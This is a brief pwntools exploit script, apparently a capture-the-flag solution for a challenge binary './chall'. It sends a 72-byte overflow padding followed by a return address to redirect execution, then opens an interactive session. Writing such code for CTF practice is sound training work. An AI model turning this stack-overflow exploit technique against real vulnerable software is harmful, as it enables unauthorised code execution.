#!/usr/bin/env python3
from pwn import *

context.terminal = ['kitty', '-e']

exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

gdbscript = '''
    b*main
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

p = start()

p.send(b'A' * 72 + p64(0x40128c))

p.interactive()